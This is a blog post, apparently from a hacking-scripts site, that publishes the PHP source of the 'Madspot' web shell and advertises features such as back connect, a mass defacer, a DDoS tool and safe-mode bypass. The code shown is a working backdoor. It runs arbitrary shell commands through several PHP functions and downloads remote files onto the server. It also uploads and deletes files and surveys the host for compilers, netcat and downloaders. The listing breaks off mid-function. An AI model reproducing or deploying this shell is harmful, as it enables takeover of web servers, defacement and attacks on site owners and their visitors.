---
id: 379
title: Madspot shell script
author: admin
layout: post
guid: http://hackingscripts.com/?p=379
permalink: /madspot-shell-script/
categories:
  - PHP
tags:
  - madspot
  - PHP
---
Madspot shell script. From the Madspot Security Team (madspot.net), or was the author Ikram Ali, as the script says?. You can find the Madspot Security Team website at pcbots.org.

The Madspot shell is written in PHP, runs on both Linux and Windows serves, and provides the following features:

  * Process List
  * Eval
  * SQL Command Panel
  * Hash Genration
  * Perl and PHP Back Connect
  * Zone-h mass defacer
  * Powerful DDOS tool from server
  * Auto Safe mode Off (priv8)
  * Whole Server Auto Symlink (Priva8 Coded)
  * Perl 500 Internal Error Bypass
  * Killcode (Delete Shell)



### Madspot shell source code

{% highlight php %}
<?php

    /**
     * @author Ikram ALI
     * @copyright 2012
     */
    @define('VERSION','1.0');
    @error_reporting(E_ALL ^ E_NOTICE);
    @session_start();
    @ini_set('error_log',NULL);
    @ini_set('log_errors',0);
    @ini_set('max_execution_time',0);
    @set_time_limit(0);
    @set_magic_quotes_runtime(0);

    if(get_magic_quotes_gpc()) {
            function madstripslashes($array) {
                    return is_array($array) ? array_map('madstripslashes', $array) : stripslashes($array);
            }
            $_POST = madstripslashes($_POST);
    }
    $default_action = 'FilesMan';
    $default_use_ajax = true;
    $default_charset = 'Windows-1251';
    if (strtolower(substr(PHP_OS,0,3))=="win")
        $sys='win';
     else
        $sys='unix';

    $home_cwd = @getcwd();
    if(isset($_POST['c']))
            @chdir($_POST['c']);  

    $cwd = @getcwd();
    if($sys == 'win')
    {
        $home_cwd = str_replace("\\", "/", $home_cwd);
            $cwd = str_replace("\\", "/", $cwd);
    }

    if($cwd[strlen($cwd)-1] != '/' )
            $cwd .= '/';


    function madEx($in) {
            $out = '';
            if (function_exists('exec')) {
                    @exec($in,$out);
                    $out = @join("\n",$out);
            } elseif (function_exists('passthru')) {
                    ob_start();
                    @passthru($in);
                    $out = ob_get_clean();
            } elseif (function_exists('system')) {
                    ob_start();
                    @system($in);
                    $out = ob_get_clean();
            } elseif (function_exists('shell_exec')) {
                    $out = shell_exec($in);
            } elseif (is_resource($f = @popen($in,"r"))) {
                    $out = "";
                    while(!@feof($f))
                            $out .= fread($f,1024);
                    pclose($f);
            }
            return $out;
    }
    $down=@getcwd();
    if($sys=="win")
    $down.='\\';
    else
    $down.='/';
    if(isset($_POST['rtdown']))
    {
    $url = $_POST['rtdown'];
    $newfname = $down. basename($url);
    $file = fopen ($url, "rb");
    if ($file) {
      $newf = fopen ($newfname, "wb");
      if ($newf)
      while(!feof($file)) {
        fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
      }
      }

    if ($file) {
      fclose($file);
    }
    if ($newf) {
      fclose($newf);
    }
    }



     function madhead()
     {
        if(empty($_POST['charset']))
                    $_POST['charset'] = $GLOBALS['default_charset'];

    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    $totalSpace = $totalSpace?$totalSpace:1;

    $on="&lt;font color=#0F0&gt; ON &lt;/font&gt;";
    $of="&lt;font color=red&gt; OFF &lt;/font&gt;";
    $none="&lt;font color=#0F0&gt; NONE &lt;/font&gt;";  
    if(function_exists('curl_version'))
        $curl=$on;
    else
        $curl=$of;
    if(function_exists('mysql_get_client_info'))
        $mysql=$on;
     else
        $mysql=$of;
    if(function_exists('mssql_connect'))
        $mssql=$on;
    else
       $mssql=$of;

    if(function_exists('pg_connect'))
        $pg=$on;
    else
       $pg=$of;
    if(function_exists('oci_connect'))
       $or=$on;
    else
       $or=$of;
    if(@ini_get('disable_functions'))
      $disfun=@ini_get('disable_functions');
    else
    $disfun="All Functions Enable";
    if(@ini_get('safe_mode'))
    $safe_modes="&lt;font color=red&gt;ON&lt;/font&gt;";
    else
    $safe_modes="&lt;font color=#0F0 &gt;OFF&lt;/font&gt;";
    if(@ini_get('open_basedir'))
    $open_b=@ini_get('open_basedir');
        else
      $open_b=$none;


    if(@ini_get('safe_mode_exec_dir'))
    $safe_exe=@ini_get('safe_mode_exec_dir');
        else
    $safe_exe=$none;
    if(@ini_get('safe_mode_include_dir'))
       $safe_include=@ini_get('safe_mode_include_dir');
    else
     $safe_include=$none;
    if(!function_exists('posix_getegid'))
    {
                    $user = @get_current_user();
                    $uid = @getmyuid();
                    $gid = @getmygid();
                    $group = "?";
    } else
    {
                    $uid = @posix_getpwuid(posix_geteuid());
                    $gid = @posix_getgrgid(posix_getegid());
                    $user = $uid['name'];
                    $uid = $uid['uid'];
                    $group = $gid['name'];
                    $gid = $gid['gid'];
            }


         $cwd_links = '';
            $path = explode("/", $GLOBALS['cwd']);
            $n=count($path);
            for($i=0; $i&lt;$n-1; $i++) {
                    $cwd_links .= "&lt;a  href='#' onclick='g(\"FilesMan\",\"";
                    for($j=0; $j&lt;=$i; $j++)
                            $cwd_links .= $path[$j].'/';
                    $cwd_links .= "\")'&gt;".$path[$i]."/&lt;/a&gt;";
            }

    $drives = "";
    foreach(range('c','z') as $drive)
    if(is_dir($drive.':\\'))
    $drives .= '&lt;a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')"&gt;[ '.$drive.' ]&lt;/a&gt; ';





     echo '&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
    &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
    &lt;head&gt;
    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
    &lt;link href="http://www.madspot.net/favicon.ico" rel="icon" type="image/x-icon"/&gt;
    &lt;title&gt;Madspot Security Team Shell&lt;/title&gt;
    &lt;style type="text/css"&gt;
    &lt;!--
    .whole {
            background-color: #CCC;
            height:auto;
            width: auto;
            margin-top: 10px;
            margin-right: 10px;
            margin-left: 10px;
    }
    .header {
            height: auto;
            width: auto;
            border: 7px solid #CCC;
            color: #999;
            font-size: 12px;
            font-family: Verdana, Geneva, sans-serif;
            background-color: #000;
    }
    .header a {color:#0F0; text-decoration:none;}
    span {
            font-weight: bolder;
            color: #FFF;
    }
    #meunlist {
            font-family: Verdana, Geneva, sans-serif;
            color: #FFF;
            background-color: #000;
            width: auto;
            border-right-width: 7px;
            border-left-width: 7px;
            border-top-style: solid;
            border-right-style: solid;
            border-bottom-style: solid;
            border-left-style: solid;
            border-top-color: #CCC;
            border-right-color: #CCC;
            border-bottom-color: #CCC;
            border-left-color: #CCC;
            height: auto;
            font-size: 12px;
            font-weight: bold;
            border-top-width: 0px;
    }
     .whole #meunlist ul {
            padding-top: 5px;
            padding-right: 5px;
            padding-bottom: 7px;
            padding-left: 2px;
            text-align:center;
            list-style-type: none;
            margin: 0px;
    }
     .whole #meunlist li {
            margin: 0px;
            padding: 0px;
            display: inline;
    }
     .whole #meunlist a {
       font-family: arial, sans-serif;
            font-size: 14px;
            text-decoration:none;
            font-weight: bold;
            color: #fff;
            clear: both;
            width: 100px;
            margin-right: -6px;
            padding-top: 3px;
            padding-right: 15px;
            padding-bottom: 3px;
            padding-left: 15px;
            border-right-width: 1px;
            border-right-style: solid;
            border-right-color: #FFF;
    }
     .whole #meunlist a:hover {
            color: #000;
            background: #fff;
    }

    .foot {
            font-family: Verdana, Geneva, sans-serif;
            background-color: #000;
            margin: 0px;
            padding: 0px;
            width: 100%;
            text-align: center;
            font-size: 12px;
            color: #CCC;
            border-right-width: 7px;
            border-left-width: 7px;
       border-bottom-width: 7px;
       border-bottom-style: solid;
       border-right-style: solid;
       border-right-style: solid;
            border-left-style: solid;
            border-top-color: #CCC;
            border-right-color: #CCC;
            border-bottom-color: #CCC;
            border-left-color: #CCC;
    }';
    if(is_writable($GLOBALS['cwd']))
     {
        echo ".foottable {
       width: 300px;
       font-weight: bold;
       }";}
        else
        {
           echo ".foottable {
       width: 300px;
       font-weight: bold;
       background-color:red;
       }
       .dir {
         background-color:red;  
       }
       ";
        }
     echo '.main th{text-align:left;}
    .main a{color: #FFF;}
    .main tr:hover{background-color:red;}
    .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
    .bigarea{ width:99%; height:300px; }  
     &lt;/style&gt;

    ';

    echo "&lt;script&gt;
       var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
       var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
       var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
       var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
       var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
       var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
       var d = document;
            function set(a,c,p1,p2,p3,charset) {
                    if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
                    if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
                    if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
                    if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
                    if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
                    if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
            }
            function g(a,c,p1,p2,p3,charset) {
                    set(a,c,p1,p2,p3,charset);
                    d.mf.submit();
            }&lt;/script&gt;";


            echo '
    &lt;/head&gt;

    &lt;body bgcolor="#000000"  leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"&gt;
    &lt;div class="whole"&gt;
    &lt;form method=post name=mf style="display:none;"&gt;
    &lt;input type=hidden name=a&gt;
    &lt;input type=hidden name=c&gt;
    &lt;input type=hidden name=p1&gt;
    &lt;input type=hidden name=p2&gt;
    &lt;input type=hidden name=p3&gt;
    &lt;input type=hidden name=charset&gt;
    &lt;/form&gt;
     &lt;div class="header"&gt;&lt;table width="100%" border="0"  align="lift"&gt;
     &lt;tr&gt;
       &lt;td width="3%"&gt;&lt;span&gt;Uname:&lt;/span&gt;&lt;/td&gt;
       &lt;td colspan="2"&gt;'.substr(@php_uname(), 0, 120).'&lt;/td&gt;
       &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;span&gt;User:&lt;/span&gt;&lt;/td&gt;
       &lt;td&gt;'. $uid . ' [ ' . $user . ' ] &lt;span&gt;   Group: &lt;/span&gt;' . $gid . ' [ ' . $group . ' ] &lt;/td&gt;
       &lt;td width="14%" rowspan="8"&gt;&lt;img alt="" src="data:image/jpeg;base64,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" /&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;span&gt;PHP:&lt;/span&gt;&lt;/td&gt;
       &lt;td&gt;'.@phpversion(). '   &lt;span&gt;   Safe Mode:'.$safe_modes.'&lt;/span&gt;&lt;/td&gt;
       &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;span&gt;Our IP:&lt;/span&gt;&lt;/td&gt;
       &lt;td&gt;'.@$_SERVER["SERVER_ADDR"].'    &lt;span&gt;Server IP:&lt;/span&gt; '.@$_SERVER["REMOTE_ADDR"].'&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;&lt;span&gt;WEBS:&lt;/span&gt;&lt;/td&gt;
       &lt;td width="76%"&gt;';

        if($GLOBALS['sys']=='unix')
        {
            $d0mains = @file("/etc/named.conf");
            if(!$d0mains)
            {
                echo "CANT READ named.conf";
            }
            else
            {
              $count;  
             foreach($d0mains as $d0main)
             {
              if(@ereg("zone",$d0main))
              {
              preg_match_all('#zone "(.*)"#', $d0main, $domains);
               flush();
              if(strlen(trim($domains[1][0])) &gt; 2){
             flush();
             $count++;
               }
               }
               }
               echo "$count  Domains";
            }
        }
        else{ echo"CANT READ |Windows|";}

          echo '&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
       &lt;td height="16"&gt;&lt;span&gt;HDD:&lt;/span&gt;&lt;/td&gt;
       &lt;td&gt;'.madSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt;' . madSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]&lt;/td&gt;
       &lt;/tr&gt;';

         if($GLOBALS['sys']=='unix' )
    {
        if(!@ini_get('safe_mode'))
        {

        echo '&lt;tr&gt;&lt;td height="18" colspan="2"&gt;&lt;span&gt;Useful : &lt;/span&gt;';
        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
         foreach($userful as $item)
             if(madWhich($item))
             echo $item.',';
             echo '&lt;/td&gt;
            &lt;/tr&gt;
             &lt;tr&gt;
             &lt;td height="0" colspan="2"&gt;&lt;span&gt;Downloader:&lt;/span&gt;';

         $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
          foreach($downloaders as $item2)
           if(madWhich($item2))
            echo $item2.',';
            echo '&lt;/td&gt;
                 &lt;/tr&gt;';

              }
               else
               {
             echo '&lt;tr&gt;&lt;td height="18" colspan="2"&gt;&lt;span&gt;useful:&lt;/span&gt;';
             echo '--------------&lt;/td&gt;
              &lt;/tr&gt;&lt;td height="0" colspan="2"&gt;&lt;span&gt;Downloader: &lt;/span&gt;-------------&lt;/td&gt;
                 &lt;/tr&gt;';  
             }
    }
    else
    {
       echo '&lt;tr&gt;&lt;td height="18" colspan="2"&gt;&lt;span&gt;Window:&lt;/span&gt;';
       echo madEx('ver');
       echo '&lt;/td&gt;
            &lt;/tr&gt; &lt;tr&gt;
           &lt;td height="0" colspan="2"&gt;&lt;span&gt;Downloader: &lt;/span&gt;-------------&lt;/td&gt;
                 &lt;/tr&gt;';

    }  


     echo '&lt;tr&gt;
       &lt;td height="16" colspan="2"&gt;&lt;span&gt;Disabled functions:&lt;/span&gt;'.$disfun.'&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td height="16" colspan="2"&gt;&lt;span&gt;cURL:'.$curl.'  MySQL:'.$mysql.'  MSSQL:'.$mssql.'  PostgreSQL:'.$pg.'  Oracle: &lt;/span&gt;'.$or.'&lt;/td&gt;&lt;td width="15%"&gt;'.base64_decode("PGEgaHJlZj0iaHR0cDovL3d3dy5tYWRzcG90Lm5ldCIgdGFyZ2V0PSJfYmxhbmsiPjxzcGFuPjxmb250IGNvbG9yPSIjMEYwIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtNQURTUE9ULk5FVDwvZm9udD48L3NwYW4+PC9hPg==").'&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
     &lt;td height="11" colspan="3"&gt;&lt;span&gt;Open_basedir:'.$open_b.' Safe_mode_exec_dir:'.$safe_exe.'   Safe_mode_include_dir:'.$safe_include.'&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td height="11"&gt;&lt;span&gt;Server &lt;/span&gt;&lt;/td&gt;
       &lt;td colspan="2"&gt;'.@getenv('SERVER_SOFTWARE').'&lt;/td&gt;
     &lt;/tr&gt;';
      if($GLOBALS[sys]=="win")
      {
        echo '&lt;tr&gt;
       &lt;td height="12"&gt;&lt;span&gt;DRIVE:&lt;/span&gt;&lt;/td&gt;
       &lt;td colspan="2"&gt;'.$drives.'&lt;/td&gt;
        &lt;/tr&gt;';
      }

      echo '&lt;tr&gt;
       &lt;td height="12"&gt;&lt;span&gt;PWD:&lt;/span&gt;&lt;/td&gt;
       &lt;td colspan="2"&gt;'.$cwd_links.'  &lt;a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"&gt;&lt;font color=red &gt;|CURRENT|&lt;/font&gt;&lt;/a&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;/table&gt;
    &lt;/div&gt;
    &lt;div id="meunlist"&gt;
         &lt;ul&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')"&gt;HOME&lt;/a&gt;&lt;/li&gt;

    &lt;li&gt;&lt;a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')"&gt;PROCESS&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')"&gt;EVAL&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')"&gt;SQL&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'hash\',null,\'\',\'\',\'\')"&gt;HASH&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'connect\',null,\'\',\'\',\'\')"&gt;CONNECT&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'zoneh\',null,\'\',\'\',\'\')"&gt;ZONE-H&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'dos\',null,\'\',\'\',\'\')"&gt;DDOS&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'safe\',null,\'\',\'\',\'\')"&gt;SAFE MODE&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'symlink\',null,\'\',\'\',\'\')"&gt;SYMLINK&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'spot\',null,\'\',\'\',\'\')"&gt;MADSPOT&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="#" onclick="g(\'selfrm\',null,\'\',\'\',\'\')"&gt;KIll C0de&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;

       &lt;/div&gt;
    ';  

    }

    function madfooter()
    {

        echo "&lt;table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' &gt;
          &lt;tr&gt;
            &lt;td width='17%'&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"&gt;&lt;span&gt;__MK FILE__&lt;/span&gt;&lt;br&gt;&lt;input class='dir'  type=text name=f value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
            &lt;td width='21%'&gt;&lt;form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"&gt;&lt;span&gt;__MK DIR__&lt;/span&gt;&lt;br&gt;&lt;input class='dir' type=text name=d value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
            &lt;td width='22%'&gt;&lt;form onsubmit=\"g('FilesMan',null,'delete',this.del.value);return false;\"&gt;&lt;span&gt;__DELETE__&lt;/span&gt;&lt;br&gt;&lt;input class='dir' type=text name=del value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
            &lt;td width='19%'&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value,'chmod');return false;\"&gt;&lt;span&gt;__CHMOD__&lt;/span&gt;&lt;br&gt;&lt;input class='dir' type=text name=f value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
          &lt;/tr&gt;
          &lt;tr&gt;
            &lt;td colspan='2'&gt;&lt;form onsubmit='g(null,this.c.value,\"\");return false;'&gt;&lt;span&gt;__CHANGE DIR__&lt;/span&gt;&lt;br&gt;&lt;input class='foottable' type=text name=c value='".htmlspecialchars($GLOBALS['cwd'])."'&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
            &lt;td colspan='2'&gt;&lt;form method='post' &gt;&lt;span&gt;__HTTP DOWNLOAD__&lt;/span&gt;&lt;br&gt;&lt;input class='foottable' type=text name=rtdown value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
           &lt;/tr&gt;
          &lt;tr&gt;
            &lt;td colspan='4'&gt;&lt;form onsubmit=\"g('proc',null,this.c.value);return false;\"&gt;&lt;span&gt;__EXECUTE__&lt;/span&gt;&lt;br&gt;&lt;input class='foottable' type=text name=c value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
           &lt;/tr&gt;
          &lt;tr&gt;
            &lt;td colspan='4'&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt;
                    &lt;input type=hidden name=a value='FilesMAn'&gt;
                    &lt;input type=hidden name=c value='" . $GLOBALS['cwd'] ."'&gt;
                    &lt;input type=hidden name=p1 value='uploadFile'&gt;
                    &lt;input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'&gt;
           &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=file name=f&gt;&lt;br /&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
           &lt;/tr&gt;
         &lt;/table&gt;
     &lt;/div&gt;
     &lt;/body&gt;
    &lt;/html&gt;
    ";

    }
    if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
       function posix_getpwuid($p) {return false;} }
    if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
      function posix_getgrgid($p) {return false;} }

    function madWhich($p) {
            $path = madEx('which ' . $p);
            if(!empty($path))
                    return $path;
            return false;
    }



    function madSize($s) {
            if($s &gt;= 1073741824)
                    return sprintf('%1.2f', $s / 1073741824 ). ' GB';
            elseif($s &gt;= 1048576)
